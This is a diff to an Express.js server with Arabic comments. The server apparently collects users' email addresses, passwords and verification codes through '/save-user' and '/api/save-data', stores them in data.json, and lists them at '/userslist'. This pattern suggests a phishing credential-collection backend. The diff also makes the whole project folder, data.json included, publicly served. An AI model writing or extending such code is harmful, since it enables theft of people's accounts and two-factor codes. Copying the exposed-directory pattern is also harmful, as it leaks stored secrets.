@@ -4,13 +4,16 @@ const fs = require('fs');
 
 const app = express();
 
+// إعدادات قراءة البيانات المدخلة في الطلبات (JSON & Form data)
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+
+// جعل جميع الملفات في المجلد الرئيسي متاحة للوصول (مثل index.html و CSS و JS)
+app.use(express.static(__dirname));
 
 const filePath = path.join(__dirname, 'data.json');
 
-// وظيفة قراءة البيانات من الملف
+// وظيفة قراءة البيانات من ملف data.json
 function readData() {
   if (fs.existsSync(filePath)) {
     try {
@@ -41,7 +44,7 @@ app.post('/save-user', (req, res) => {
   res.json({ status: 'success' });
 });
 
-// مسار حفظ البيانات القديم (/api/save-data)
+// مسار حفظ البيانات الاحتياطي (/api/save-data)
 app.post('/api/save-data', (req, res) => {
   const { email, password, code } = req.body;
   
@@ -59,7 +62,7 @@ app.post('/api/save-data', (req, res) => {
   res.json({ status: 'success' });
 });
 
-// مسار عرض قائمة الحسابات والبيانات /userslist
+// مسار عرض قائمة الحسابات والبيانات (/userslist)
 app.get('/userslist', (req, res) => {
   const users = readData();
   
@@ -115,8 +118,7 @@ app.get('/userslist', (req, res) => {
   res.send(html);
 });
 
-app.use(express.static(__dirname));
-
+// المسار الرئيسي للواجهة
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
